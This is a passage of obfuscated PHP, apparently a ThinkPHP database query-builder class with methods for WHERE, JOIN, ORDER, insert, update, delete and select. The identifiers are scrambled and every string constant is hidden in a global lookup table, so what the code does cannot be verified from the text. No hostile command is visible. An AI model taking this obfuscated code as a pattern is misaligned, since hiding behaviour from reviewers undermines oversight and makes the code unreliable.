think_status($å±Şã—¯[1085]); think_trace($this->queryStr . $å±Şã—¯[1086] . think_status($å±Şã—¯[24], $å±Şã—¯[1085], 6) . $å±Şã—¯[1087], $å±Şã—¯[12], $å±Şã—¯[1088]); } } protected function parseLock($°±ŒëÆÃ = false) { $‘³ûË·’ =& $_SERVER[¯‘·½]; if (!$°±ŒëÆÃ) { return $‘³ûË·’[12]; } if ($‘³ûË·’[1014] == $this->dbType) { return $‘³ûË·’[1089]; } return $‘³ûË·’[1090]; } protected function parseSet($—Ã„¯á) { $ã…àˆÑ€ =& $_SERVER[¯‘·½]; foreach ($—Ã„¯á as $õòÊ„Û¸ => $øŞÒØ†Ù) { if (is_array($øŞÒØ†Ù) && $ã…àˆÑ€[374] == $øŞÒØ†Ù[0]) { $‹ËâÑ’ß[] = $this->parseKey($õòÊ„Û¸) . $ã…àˆÑ€[508] . $øŞÒØ†Ù[1]; } elseif (is_scalar($øŞÒØ†Ù) || is_null($øŞÒØ†Ù)) { $‹ËâÑ’ß[] = $this->parseKey($õòÊ„Û¸) . $ã…àˆÑ€[508] . $this->parseValue($øŞÒØ†Ù); } } return $ã…àˆÑ€[1091] . implode($ã…àˆÑ€[50], $‹ËâÑ’ß); } protected function bindParam($ÀòøÔ¯Ì, $®‹áËóî) { $this->bind[$_SERVER[¯‘·½][4] . $ÀòøÔ¯Ì] = $®‹áËóî; } protected function parseBind($ú²ªòµ) { $ú²ªòµ = array_merge($this->bind, $ú²ªòµ); $this->bind = array(); return $ú²ªòµ; } function parseKey(&$‘ïôî£¡, $ˆ”÷×ú = true) { if ($ˆ”÷×ú) { $‘ïôî£¡ = $this->parseKeyCheck($‘ïôî£¡); } return $‘ïôî£¡; } function parseKeyCheck($ŞÚ×‘³«) { $«®¶–Æ =& $_SERVER[¯‘·½]; $ŞÚ×‘³« = trim($ŞÚ×‘³«); if (!preg_match($«®¶–Æ[1092], $ŞÚ×‘³«)) { think_exception($«®¶–Æ[1093] . $ŞÚ×‘³«); } return $ŞÚ×‘³«; } protected function parseValue($’ŞŸæ„¬) { $çºìîÑÒ =& $_SERVER[¯‘·½]; if (is_string($’ŞŸæ„¬)) { $’ŞŸæ„¬ = $çºìîÑÒ[1053] . $this->escapeString($’ŞŸæ„¬) . $çºìîÑÒ[1053]; } elseif (isset($’ŞŸæ„¬[0]) && is_string($’ŞŸæ„¬[0]) && strtolower($’ŞŸæ„¬[0]) == $çºìîÑÒ[374]) { $’ŞŸæ„¬ = $this->escapeString($’ŞŸæ„¬[1]); } elseif (is_array($’ŞŸæ„¬)) { $’ŞŸæ„¬ = array_map(array($this, $çºìîÑÒ[1054]), $’ŞŸæ„¬); } elseif (is_bool($’ŞŸæ„¬)) { $’ŞŸæ„¬ = $’ŞŸæ„¬ ? $çºìîÑÒ[91] : $çºìîÑÒ[231]; } elseif (is_null($’ŞŸæ„¬)) { $’ŞŸæ„¬ = $çºìîÑÒ[106]; } return $’ŞŸæ„¬; } protected function parseField($ä™“´Ÿ½) { $ÙïªÀ =& $_SERVER[¯‘·½]; if (is_string($ä™“´Ÿ½) && strpos($ä™“´Ÿ½, $ÙïªÀ[50])) { $ä™“´Ÿ½ = explode($ÙïªÀ[50], $ä™“´Ÿ½); } if (is_array($ä™“´Ÿ½)) { $ı¥Û¬¨ = array(); foreach ($ä™“´Ÿ½ as $Ä‚İ£Şğ => $Õ×÷±Ô‚) { if (!is_numeric($Ä‚İ£Şğ)) { $ı¥Û¬¨[] = $this->parseKey($Ä‚İ£Şğ, !1) . $ÙïªÀ[1094] . $this->parseKey($Õ×÷±Ô‚); } else { $ı¥Û¬¨[] = $this->parseKey($Õ×÷±Ô‚); } } $–áü‘Ç = implode($ÙïªÀ[50], $ı¥Û¬¨); } elseif (is_string($ä™“´Ÿ½) && !empty($ä™“´Ÿ½)) { $–áü‘Ç = $ä™“´Ÿ½; } else { $–áü‘Ç = $ÙïªÀ[223]; } return $–áü‘Ç; } protected function parseTable($¿Í™ÇÃ) { $÷îÁÑ¸ë =& $_SERVER[¯‘·½]; if (is_array($¿Í™ÇÃ)) { $üş‘€îÛ = array(); foreach ($¿Í™ÇÃ as $èßôöØí => $²ƒ×î–â) { if (!is_numeric($èßôöØí)) { $üş‘€îÛ[] = $this->parseKey($èßôöØí) . $÷îÁÑ¸ë[53] . $this->parseKey($²ƒ×î–â); } else { $üş‘€îÛ[] = $this->parseKey($èßôöØí); } } $¿Í™ÇÃ = $üş‘€îÛ; } elseif (is_string($¿Í™ÇÃ)) { if (strstr($¿Í™ÇÃ, $÷îÁÑ¸ë[53])) { return $¿Í™ÇÃ; } $¿Í™ÇÃ = explode($÷îÁÑ¸ë[50], $¿Í™ÇÃ); array_walk($¿Í™ÇÃ, array($this, $÷îÁÑ¸ë[1002])); } return $÷îÁÑ¸ë[996] . trim(implode($÷îÁÑ¸ë[1095], $¿Í™ÇÃ), $÷îÁÑ¸ë[463]) . $÷îÁÑ¸ë[996]; } protected function parseWhere($İş³‰›·) { $‡ÖÆ²€¸ =& $_SERVER[¯‘·½]; $öáÒ¥ï = $‡ÖÆ²€¸[12]; if (is_string($İş³‰›·)) { $öáÒ¥ï = $İş³‰›·; } else { $Üæ©Ñôş = isset($İş³‰›·[$‡ÖÆ²€¸[1096]]) ? strtoupper($İş³‰›·[$‡ÖÆ²€¸[1096]]) : $‡ÖÆ²€¸[12]; if (in_array($Üæ©Ñôş, array($‡ÖÆ²€¸[1097], $‡ÖÆ²€¸[1098], $‡ÖÆ²€¸[1099]))) { $Üæ©Ñôş = $‡ÖÆ²€¸[53] . $Üæ©Ñôş . $‡ÖÆ²€¸[53]; unset($İş³‰›·[$‡ÖÆ²€¸[1096]]); } else { $Üæ©Ñôş = $‡ÖÆ²€¸[1100]; } foreach ($İş³‰›· as $Ø©‰‚°î => $šáŠÃµ¨) { $öáÒ¥ï .= $‡ÖÆ²€¸[357]; if (is_numeric($Ø©‰‚°î)) { $Ø©‰‚°î = $‡ÖÆ²€¸[1101]; } if (0 === strpos($Ø©‰‚°î, $‡ÖÆ²€¸[11])) { $öáÒ¥ï .= $this->parseThinkWhere($Ø©‰‚°î, $šáŠÃµ¨); } else { if (!preg_match($‡ÖÆ²€¸[1102], trim($Ø©‰‚°î))) { think_exception(think_lang($‡ÖÆ²€¸[1103]) . $‡ÖÆ²€¸[4] . $Ø©‰‚°î); } $Ü¢«Áô = is_array($šáŠÃµ¨) && isset($šáŠÃµ¨[$‡ÖÆ²€¸[1104]]); $Ø©‰‚°î = trim($Ø©‰‚°î); if (strpos($Ø©‰‚°î, $‡ÖÆ²€¸[215])) { $Î²£ˆ÷ = explode($‡ÖÆ²€¸[215], $Ø©‰‚°î); $Šº¢ñôò = array(); foreach ($Î²£ˆ÷ as $Ù²Å½ãï => $¤ÃŞí°Î) { $ÁÑ“‡âä = $Ü¢«Áô ? $šáŠÃµ¨[$Ù²Å½ãï] : $šáŠÃµ¨; $Šº¢ñôò[] = $‡ÖÆ²€¸[340] . $this->parseWhereItem($this->parseKey($¤ÃŞí°Î), $ÁÑ“‡âä) . $‡ÖÆ²€¸[1001]; } $öáÒ¥ï .= implode($‡ÖÆ²€¸[1105], $Šº¢ñôò); } elseif (strpos($Ø©‰‚°î, $‡ÖÆ²€¸[287])) { $Î²£ˆ÷ = explode($‡ÖÆ²€¸[287], $Ø©‰‚°î); $Šº¢ñôò = array(); foreach ($Î²£ˆ÷ as $Ù²Å½ãï => $¤ÃŞí°Î) { $ÁÑ“‡âä = $Ü¢«Áô ? $šáŠÃµ¨[$Ù²Å½ãï] : $šáŠÃµ¨; $Šº¢ñôò[] = $‡ÖÆ²€¸[340] . $this->parseWhereItem($this->parseKey($¤ÃŞí°Î), $ÁÑ“‡âä) . $‡ÖÆ²€¸[1001]; } $öáÒ¥ï .= implode($‡ÖÆ²€¸[1100], $Šº¢ñôò); } else { $öáÒ¥ï .= $this->parseWhereItem($this->parseKey($Ø©‰‚°î), $šáŠÃµ¨); } } $öáÒ¥ï .= $‡ÖÆ²€¸[358] . $Üæ©Ñôş; } $öáÒ¥ï = substr($öáÒ¥ï, 0, -strlen($Üæ©Ñôş)); } return empty($öáÒ¥ï) ? $‡ÖÆ²€¸[12] : $‡ÖÆ²€¸[1106] . $öáÒ¥ï; } protected function parseWhereItem($·¾ÁÇçÈ, $†“©ßúà) { $˜†Éî¢İ =& $_SERVER[¯‘·½]; $ÃŠ—âÊ» = $˜†Éî¢İ[12]; if (is_array($†“©ßúà)) { if (is_string($†“©ßúà[0])) { $ë¢Óå™¢ = strtolower($†“©ßúà[0]); if (in_array($†“©ßúà[0], array($˜†Éî¢İ[508], $˜†Éî¢İ[1107], $˜†Éî¢İ[1108], $˜†Éî¢İ[1109], $˜†Éî¢İ[1110], $˜†Éî¢İ[1111]))) { $ÃŠ—âÊ» .= $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $†“©ßúà[0] . $˜†Éî¢İ[53] . $this->parseValue($†“©ßúà[1]); } elseif (preg_match($˜†Éî¢İ[1112], $†“©ßúà[0])) { $ÃŠ—âÊ» .= $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $this->exp[$ë¢Óå™¢] . $˜†Éî¢İ[53] . $this->parseValue($†“©ßúà[1]); } elseif (preg_match($˜†Éî¢İ[1113], $†“©ßúà[0])) { if (is_array($†“©ßúà[1])) { $ç‡Ï×óÜ = isset($†“©ßúà[2]) ? strtoupper($†“©ßúà[2]) : $˜†Éî¢İ[1098]; if (in_array($ç‡Ï×óÜ, array($˜†Éî¢İ[1097], $˜†Éî¢İ[1098], $˜†Éî¢İ[1099]))) { $ÇõŒîÕĞ = array(); foreach ($†“©ßúà[1] as $àßÜ¶´Î) { $ÇõŒîÕĞ[] = $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $this->exp[$ë¢Óå™¢] . $˜†Éî¢İ[53] . $this->parseValue($àßÜ¶´Î); } $ÃŠ—âÊ» .= $˜†Éî¢İ[340] . implode($˜†Éî¢İ[53] . $ç‡Ï×óÜ . $˜†Éî¢İ[53], $ÇõŒîÕĞ) . $˜†Éî¢İ[1001]; } } else { $ÃŠ—âÊ» .= $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $this->exp[$ë¢Óå™¢] . $˜†Éî¢İ[53] . $this->parseValue($†“©ßúà[1]); } } elseif ($˜†Éî¢İ[374] == $ë¢Óå™¢) { $ÃŠ—âÊ» .= $˜†Éî¢İ[999] . $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $†“©ßúà[1] . $˜†Éî¢İ[1114]; } elseif (preg_match($˜†Éî¢İ[1115], $†“©ßúà[0])) { $ÃŠ—âÊ» .= $†“©ßúà[0]; } elseif (preg_match($˜†Éî¢İ[1116], $†“©ßúà[0])) { if (isset($†“©ßúà[2]) && $˜†Éî¢İ[374] == $†“©ßúà[2]) { $ÃŠ—âÊ» .= $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $this->exp[$ë¢Óå™¢] . $˜†Éî¢İ[53] . $†“©ßúà[1]; } else { if (is_string($†“©ßúà[1])) { $†“©ßúà[1] = explode($˜†Éî¢İ[50], $†“©ßúà[1]); } $Æè­à— = implode($˜†Éî¢İ[50], $this->parseValue($†“©ßúà[1])); $ÃŠ—âÊ» .= $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $this->exp[$ë¢Óå™¢] . $˜†Éî¢İ[999] . $Æè­à— . $˜†Éî¢İ[1001]; } } elseif (preg_match($˜†Éî¢İ[1117], $†“©ßúà[0])) { $÷ï¥³‹Ê = is_string($†“©ßúà[1]) ? explode($˜†Éî¢İ[50], $†“©ßúà[1]) : $†“©ßúà[1]; $ÃŠ—âÊ» .= $˜†Éî¢İ[999] . $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $this->exp[$ë¢Óå™¢] . $˜†Éî¢İ[53] . $this->parseValue($÷ï¥³‹Ê[0]) . $˜†Éî¢İ[1100] . $this->parseValue($÷ï¥³‹Ê[1]) . $˜†Éî¢İ[358]; } else { think_exception(think_lang($˜†Éî¢İ[1103]) . $˜†Éî¢İ[4] . $†“©ßúà[0]); } } else { $èá´Êóİ = count($†“©ßúà); $Åá…Ó¿À = $˜†Éî¢İ[12]; if (is_string($†“©ßúà[$èá´Êóİ - 1])) { $Åá…Ó¿À = isset($†“©ßúà[$èá´Êóİ - 1]) ? strtoupper($†“©ßúà[$èá´Êóİ - 1]) : $˜†Éî¢İ[12]; if (in_array($Åá…Ó¿À, array($˜†Éî¢İ[1097], $˜†Éî¢İ[1098], $˜†Éî¢İ[1099]))) { $èá´Êóİ = $èá´Êóİ - 1; } } else { $Åá…Ó¿À = $˜†Éî¢İ[1097]; } for ($ë±š ñ‰ = 0; $ë±š ñ‰ < $èá´Êóİ; $ë±š ñ‰++) { $÷ï¥³‹Ê = is_array($†“©ßúà[$ë±š ñ‰]) ? $†“©ßúà[$ë±š ñ‰][1] : $†“©ßúà[$ë±š ñ‰]; if ($˜†Éî¢İ[374] == strtolower($†“©ßúà[$ë±š ñ‰][0])) { $ÃŠ—âÊ» .= $˜†Éî¢İ[340] . $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $÷ï¥³‹Ê . $˜†Éî¢İ[1114] . $Åá…Ó¿À . $˜†Éî¢İ[53]; } else { $ÇÕĞÙÔª = is_array($†“©ßúà[$ë±š ñ‰]) ? $this->exp[strtolower($†“©ßúà[$ë±š ñ‰][0])] : $˜†Éî¢İ[508]; if (!$ÇÕĞÙÔª && is_array($†“©ßúà[$ë±š ñ‰]) && in_array($†“©ßúà[$ë±š ñ‰][0], array($˜†Éî¢İ[508], $˜†Éî¢İ[1107], $˜†Éî¢İ[1108], $˜†Éî¢İ[1109], $˜†Éî¢İ[1110], $˜†Éî¢İ[1111]))) { $ÇÕĞÙÔª = $†“©ßúà[$ë±š ñ‰][0]; } $ÃŠ—âÊ» .= $˜†Éî¢İ[340] . $·¾ÁÇçÈ . $˜†Éî¢İ[53] . $ÇÕĞÙÔª . $˜†Éî¢İ[53] . $this->parseValue($÷ï¥³‹Ê) . $˜†Éî¢İ[1114] . $Åá…Ó¿À . $˜†Éî¢İ[53]; } } $ÃŠ—âÊ» = substr($ÃŠ—âÊ», 0, -4); } } else { $ÃŠ—âÊ» .= $·¾ÁÇçÈ . $˜†Éî¢İ[1118] . $this->parseValue($†“©ßúà); } return $ÃŠ—âÊ»; } protected function parseThinkWhere($¢‚™êë, $–…ä‹ÈÒ) { $È§ı„í‰ =& $_SERVER[¯‘·½]; $Ë­ÉÌâê = $È§ı„í‰[12]; switch ($¢‚™êë) { case $È§ı„í‰[429]: $Ë­ÉÌâê = $–…ä‹ÈÒ; break; case $È§ı„í‰[1101]: $Ë­ÉÌâê = is_string($–…ä‹ÈÒ) ? $–…ä‹ÈÒ : substr($this->parseWhere($–…ä‹ÈÒ), 6); break; case $È§ı„í‰[1119]: parse_str($–…ä‹ÈÒ, $Œ•Ôß÷); if (isset($Œ•Ôß÷[$È§ı„í‰[1096]])) { $ÉŞ¶çâš = $È§ı„í‰[53] . strtoupper($Œ•Ôß÷[$È§ı„í‰[1096]]) . $È§ı„í‰[53]; unset($Œ•Ôß÷[$È§ı„í‰[1096]]); } else { $ÉŞ¶çâš = $È§ı„í‰[1100]; } $ì¶·ÂêÃ = array(); foreach ($Œ•Ôß÷ as $ê¤×¢¢ => $£±ÀÂ¢¢) { $ì¶·ÂêÃ[] = $this->parseKey($ê¤×¢¢) . $È§ı„í‰[1118] . $this->parseValue($£±ÀÂ¢¢); } $Ë­ÉÌâê = implode($ÉŞ¶çâš, $ì¶·ÂêÃ); break; } return $Ë­ÉÌâê; } protected function parseLimit($ÁáÅâ¼†) { $£ÚÍ ÂË =& $_SERVER[¯‘·½]; return !empty($ÁáÅâ¼†) ? $£ÚÍ ÂË[51] . $ÁáÅâ¼† . $£ÚÍ ÂË[53] : $£ÚÍ ÂË[12]; } protected function parseJoin($Ãœ²ü×ş) { $ÓŞ‚‹Éğ =& $_SERVER[¯‘·½]; $ı¹„ÇÌ˜ = $ÓŞ‚‹Éğ[12]; if (!empty($Ãœ²ü×ş)) { if (is_array($Ãœ²ü×ş)) { foreach ($Ãœ²ü×ş as $ç®Š«ğ => $Ü¶Î¢) { if (!1 !== stripos($Ü¶Î¢, $ÓŞ‚‹Éğ[1120])) { $ı¹„ÇÌ˜ .= $ÓŞ‚‹Éğ[53] . $Ü¶Î¢; } else { $ı¹„ÇÌ˜ .= $ÓŞ‚‹Éğ[1121] . $Ü¶Î¢; } } } else { $ı¹„ÇÌ˜ .= $ÓŞ‚‹Éğ[1121] . $Ãœ²ü×ş; } } $ı¹„ÇÌ˜ = preg_replace($ÓŞ‚‹Éğ[1122], think_config($ÓŞ‚‹Éğ[1026]) . $ÓŞ‚‹Éğ[1123], $ı¹„ÇÌ˜); return $ı¹„ÇÌ˜; } protected function parseOrder($§¨Û—Ğí) { $¯Õ…ÁËÜ =& $_SERVER[¯‘·½]; if (is_array($§¨Û—Ğí)) { $õÚÊŠ»™ = array(); foreach ($§¨Û—Ğí as $‡¸¥Èšê => $ü­¡‰›Ï) { if (is_numeric($‡¸¥Èšê)) { $õÚÊŠ»™[] = $this->parseKey($ü­¡‰›Ï); } else { $ü­¡‰›Ï = in_array(strtoupper(trim($ü­¡‰›Ï)), array($¯Õ…ÁËÜ[1124], $¯Õ…ÁËÜ[1125])) ? $¯Õ…ÁËÜ[53] . $ü­¡‰›Ï : $¯Õ…ÁËÜ[12]; if (preg_match($¯Õ…ÁËÜ[1126], $‡¸¥Èšê)) { $õÚÊŠ»™[] = $this->parseKey($‡¸¥Èšê) . $ü­¡‰›Ï; } else { think_exception($¯Õ…ÁËÜ[1127] . $‡¸¥Èšê); } } } $§¨Û—Ğí = implode($¯Õ…ÁËÜ[50], $õÚÊŠ»™); } return !empty($§¨Û—Ğí) ? $¯Õ…ÁËÜ[1128] . $§¨Û—Ğí : $¯Õ…ÁËÜ[12]; } protected function parseGroup($Ïş‰â°) { $Œ£ÇµÏÙ =& $_SERVER[¯‘·½]; return !empty($Ïş‰â°) ? $Œ£ÇµÏÙ[1129] . $Ïş‰â° : $Œ£ÇµÏÙ[12]; } protected function parseHaving($²š¹½Ã¸) { $››‹ã½Ë =& $_SERVER[¯‘·½]; return !empty($²š¹½Ã¸) ? $››‹ã½Ë[1130] . $²š¹½Ã¸ : $››‹ã½Ë[12]; } protected function parseComment($¼¸õ×õÖ) { $ÖÄê›Øğ =& $_SERVER[¯‘·½]; return !empty($¼¸õ×õÖ) ? $ÖÄê›Øğ[1131] . $¼¸õ×õÖ . $ÖÄê›Øğ[1132] : $ÖÄê›Øğ[12]; } protected function parseDistinct($ŒÇ”„Ÿ¼) { $Èâ¼²å =& $_SERVER[¯‘·½]; return !empty($ŒÇ”„Ÿ¼) ? $Èâ¼²å[1133] : $Èâ¼²å[12]; } protected function parseUnion($úšïÏÇï) { $–¥Ğ¤¬ã =& $_SERVER[¯‘·½]; if (empty($úšïÏÇï)) { return $–¥Ğ¤¬ã[12]; } if (isset($úšïÏÇï[$–¥Ğ¤¬ã[425]])) { $å‚ñ°¯­ = $–¥Ğ¤¬ã[1134]; unset($úšïÏÇï[$–¥Ğ¤¬ã[425]]); } else { $å‚ñ°¯­ = $–¥Ğ¤¬ã[1135]; } foreach ($úšïÏÇï as $’ƒ¤ö”˜) { $µûğˆšó[] = $å‚ñ°¯­ . (is_array($’ƒ¤ö”˜) ? $this->buildSelectSql($’ƒ¤ö”˜) : $’ƒ¤ö”˜); } return implode($–¥Ğ¤¬ã[53], $µûğˆšó); } public function insert($÷îÛ†, $µ“¹‡şä = array(), $Ìî§“»Ü = false) { $¢Å×—Ò° =& $_SERVER[¯‘·½]; $µ„­†º = $™®‡¬éï = array(); $this->model = $µ“¹‡şä[$¢Å×—Ò°[361]]; foreach ($÷îÛ† as $Úµ÷¯½á => $»›ßİ¤‡) { if (is_array($»›ßİ¤‡) && $¢Å×—Ò°[374] == $»›ßİ¤‡[0]) { $™®‡¬éï[] = $this->parseKey($Úµ÷¯½á); $µ„­†º[] = $»›ßİ¤‡[1]; } elseif (is_scalar($»›ßİ¤‡) || is_null($»›ßİ¤‡)) { $™®‡¬éï[] = $this->parseKey($Úµ÷¯½á); $µ„­†º[] = $this->parseValue($»›ßİ¤‡); } } $ˆ˜À¨áÒ = ($Ìî§“»Ü ? $¢Å×—Ò°[1003] : $¢Å×—Ò°[1004]) . $¢Å×—Ò°[1005] . $this->parseTable($µ“¹‡şä[$¢Å×—Ò°[359]]) . $¢Å×—Ò°[999] . implode($¢Å×—Ò°[50], $™®‡¬éï) . $¢Å×—Ò°[1000] . implode($¢Å×—Ò°[50], $µ„­†º) . $¢Å×—Ò°[1001]; $ˆ˜À¨áÒ .= $this->parseLock(isset($µ“¹‡şä[$¢Å×—Ò°[935]]) ? $µ“¹‡şä[$¢Å×—Ò°[935]] : !1); $ˆ˜À¨áÒ .= $this->parseComment(!empty($µ“¹‡şä[$¢Å×—Ò°[431]]) ? $µ“¹‡şä[$¢Å×—Ò°[431]] : $¢Å×—Ò°[12]); return $this->execute($ˆ˜À¨áÒ, $this->parseBind(!empty($µ“¹‡şä[$¢Å×—Ò°[363]]) ? $µ“¹‡şä[$¢Å×—Ò°[363]] : array())); } public function selectInsert($°ô“Ü¤, $ë”áÖ˜, $Ëğ¢üªº = array()) { $õÁÉíÜ =& $_SERVER[¯‘·½]; $this->model = $Ëğ¢üªº[$õÁÉíÜ[361]]; if (is_string($°ô“Ü¤)) { $°ô“Ü¤ = explode($õÁÉíÜ[50], $°ô“Ü¤); } array_walk($°ô“Ü¤, array($this, $õÁÉíÜ[1002])); $»ğÊ„¢ = $õÁÉíÜ[1136] . $this->parseTable($ë”áÖ˜) . $õÁÉíÜ[999] . implode($õÁÉíÜ[50], $°ô“Ü¤) . $õÁÉíÜ[1114]; $»ğÊ„¢ .= $this->buildSelectSql($Ëğ¢üªº); return $this->execute($»ğÊ„¢, $this->parseBind(!empty($Ëğ¢üªº[$õÁÉíÜ[363]]) ? $Ëğ¢üªº[$õÁÉíÜ[363]] : array())); } public function update($ííÙÏÏ, $©¾ØÆÊê) { $Á¬êÒõÜ =& $_SERVER[¯‘·½]; $this->model = $©¾ØÆÊê[$Á¬êÒõÜ[361]]; $ğŒïã°  = $Á¬êÒõÜ[1137] . $this->parseTable($©¾ØÆÊê[$Á¬êÒõÜ[359]]) . $this->parseSet($ííÙÏÏ) . $this->parseWhere(!empty($©¾ØÆÊê[$Á¬êÒõÜ[355]]) ? $©¾ØÆÊê[$Á¬êÒõÜ[355]] : $Á¬êÒõÜ[12]) . $this->parseOrder(!empty($©¾ØÆÊê[$Á¬êÒõÜ[443]]) ? $©¾ØÆÊê[$Á¬êÒõÜ[443]] : $Á¬êÒõÜ[12]) . $this->parseLimit(!empty($©¾ØÆÊê[$Á¬êÒõÜ[370]]) ? $©¾ØÆÊê[$Á¬êÒõÜ[370]] : $Á¬êÒõÜ[12]) . $this->parseLock(isset($©¾ØÆÊê[$Á¬êÒõÜ[935]]) ? $©¾ØÆÊê[$Á¬êÒõÜ[935]] : !1) . $this->parseComment(!empty($©¾ØÆÊê[$Á¬êÒõÜ[431]]) ? $©¾ØÆÊê[$Á¬êÒõÜ[431]] : $Á¬êÒõÜ[12]); return $this->execute($ğŒïã° , $this->parseBind(!empty($©¾ØÆÊê[$Á¬êÒõÜ[363]]) ? $©¾ØÆÊê[$Á¬êÒõÜ[363]] : array())); } public function delete($ŠïŸ·²Ç = array()) { $Ìã‰é¼â =& $_SERVER[¯‘·½]; $this->model = $ŠïŸ·²Ç[$Ìã‰é¼â[361]]; $ŒóÄ‹‘ô = $Ìã‰é¼â[1138] . $this->parseTable($ŠïŸ·²Ç[$Ìã‰é¼â[359]]) . $this->parseWhere(!empty($ŠïŸ·²Ç[$Ìã‰é¼â[355]]) ? $ŠïŸ·²Ç[$Ìã‰é¼â[355]] : $Ìã‰é¼â[12]) . $this->parseOrder(!empty($ŠïŸ·²Ç[$Ìã‰é¼â[443]]) ? $ŠïŸ·²Ç[$Ìã‰é¼â[443]] : $Ìã‰é¼â[12]) . $this->parseLimit(!empty($ŠïŸ·²Ç[$Ìã‰é¼â[370]]) ? $ŠïŸ·²Ç[$Ìã‰é¼â[370]] : $Ìã‰é¼â[12]) . $this->parseLock(isset($ŠïŸ·²Ç[$Ìã‰é¼â[935]]) ? $ŠïŸ·²Ç[$Ìã‰é¼â[935]] : !1) . $this->parseComment(!empty($ŠïŸ·²Ç[$Ìã‰é¼â[431]]) ? $ŠïŸ·²Ç[$Ìã‰é¼â[431]] : $Ìã‰é¼â[12]); return $this->execute($ŒóÄ‹‘ô, $this->parseBind(!empty($ŠïŸ·²Ç[$Ìã‰é¼â[363]]) ? $ŠïŸ·²Ç[$Ìã‰é¼â[363]] : array())); } public function select($®Ğ³ûšÇ = array()) { $ÅÎ¶Ò²â =& $_SERVER[¯‘·½]; $this->model = $®Ğ³ûšÇ[$ÅÎ¶Ò²â[361]]; $¥’ŞÍÆ = $this->buildSelectSql($®Ğ³ûšÇ); $È«½‘Ú‰ = isset($®Ğ³ûšÇ[$ÅÎ¶Ò²â[426]]) ? $®Ğ³ûšÇ[$ÅÎ¶Ò²â[426]] : !1; if ($È«½‘Ú‰) { $æ¼­ñêÃ = is_string($È«½‘Ú‰[$ÅÎ¶Ò²â[97]]) ? $È«½‘Ú‰[$ÅÎ¶Ò²â[97]] : $ÅÎ¶Ò²â[1139] . md5($¥’ŞÍÆ); $íƒ—í« = think_cache($æ¼­ñêÃ, $ÅÎ¶Ò²â[12], $È«½‘Ú‰); if (!1 !== $íƒ—í«) { return $íƒ—í«; } } $ºäË“Ì§ = $this->query($¥’ŞÍÆ, $this->parseBind(!empty($®Ğ³ûšÇ[$ÅÎ¶Ò²â[363]]) ? $®Ğ³ûšÇ[$ÅÎ¶Ò²â[363]] : array())); if ($È«½‘Ú‰ && !1 !== $ºäË“Ì§) { think_cache($æ¼­ñêÃ, $ºäË“Ì§, $È«½‘Ú‰); } return $ºäË“Ì§; } public function buildSelectSql($¡–ö»™Ê = array()) { $Éòµâ¶æ =& $_SERVER[¯‘·½]; if (isset($¡–ö»™Ê[$Éòµâ¶æ[430]])) { if (strpos($¡–ö»™Ê[$Éòµâ¶æ[430]], $Éòµâ¶æ[50])) { list($âì¢½¹, $ÃË¸Øë) = explode($Éòµâ¶æ[50], $¡–ö»™Ê[$Éòµâ¶æ[430]]); } else { $âì¢½¹ = $¡–ö»™Ê[$Éòµâ¶æ[430]]; } $âì¢½¹ = $âì¢½¹ ? $âì¢½¹ : 1; $ÃË¸Øë = isset($ÃË¸Øë) ? $ÃË¸Øë : (is_numeric($¡–ö»™Ê[$Éòµâ¶æ[370]]) ? $¡–ö»™Ê[$Éòµâ¶æ[370]] : 20); $ò‰Ìì·Õ = $ÃË¸Øë * ((int) $âì¢½¹ - 1); $¡–ö»™Ê[$Éòµâ¶æ[370]] = $ò‰Ìì·Õ . $Éòµâ¶æ[50] . $ÃË¸Øë; } if (think_config($Éòµâ¶æ[1140])) { $áŞÉÑìÆ = $Éòµâ¶æ[1141] . md5(serialize($¡–ö»™Ê)); $Ï½ÙíÃ = think_cache($áŞÉÑìÆ); if ($Ï½ÙíÃ) { return $Ï½ÙíÃ; } } $§†£÷Ş© = $this->parseSql($this->selectSql, $¡–ö»™Ê); $§†£÷Ş© .= $this->parseLock(isset($¡–ö»™Ê[$Éòµâ¶æ[935]]) ? $¡–ö»™Ê[$Éòµâ¶æ[935]] : !1); if (isset($áŞÉÑìÆ)) { think_cache($áŞÉÑìÆ, $§†£÷Ş©); } return $§†£÷Ş©; } public function parseSql($ä£Ø§, $š±çÊ = array()) { $ä›ñ¥ïí =& $_SERVER[¯‘·½]; $ä£Ø§ = str_replace(array($ä›ñ¥ïí[1142], $ä›ñ¥ïí[1143], $ä›ñ¥ïí[1144], $ä›ñ¥ïí[1145], $ä›ñ¥ïí[1146], $ä›ñ¥ïí[1147], $ä›ñ¥ïí[1148], $ä›ñ¥ïí[1149], $ä›ñ¥ïí[1150], $ä›ñ¥ïí[1151], $ä›ñ¥ïí[1152]), array($this->parseTable("{$š±çÊ[$ä›ñ¥ïí[359]]}"), $this->parseDistinct(isset($š±çÊ[$ä›ñ¥ïí[1153]]) ? $š±çÊ[$ä›ñ¥ïí[1153]] : !1), $this->parseField(!empty($š±çÊ[$ä›ñ¥ïí[353]]) ? $š±çÊ[$ä›ñ¥ïí[353]] : $ä›ñ¥ïí[223]), $this->parseJoin(!empty($š±çÊ[$ä›ñ¥ïí[362]]) ? $š±çÊ[$ä›ñ¥ïí[362]] : $ä›ñ¥ïí[12]), $this->parseWhere(!empty($š±çÊ[$ä›ñ¥ïí[355]]) ? $š±çÊ[$ä›ñ¥ïí[355]] : $ä›ñ¥ïí[12]), $this->parseGroup(!empty($š±çÊ[$ä›ñ¥ïí[582]]) ? $š±çÊ[$ä›ñ¥ïí[582]] : $ä›ñ¥ïí[12]), $this->parseHaving(!empty($š±çÊ[$ä›ñ¥ïí[1154]]) ? $š±çÊ[$ä›ñ¥ïí[1154]] : $ä›ñ¥ïí[12]), $this->parseOrder(!empty($š±çÊ[$ä›ñ¥ïí[443]]) ? $š±çÊ[$ä›ñ¥ïí[443]] : $ä›ñ¥ïí[12]), $this->parseLimit(!empty($š±çÊ[$ä›ñ¥ïí[370]]) ? $š±çÊ[$ä›ñ¥ïí[370]] : $ä›ñ¥ïí[12]), $this->parseUnion(!empty($š±çÊ[$ä›ñ¥ïí[424]]) ? $š±çÊ[$ä›ñ¥ïí[424]] : $ä›ñ¥ïí[12]), $this->parseComment(!empty($š±çÊ[$ä›ñ¥ïí[431]]) ? 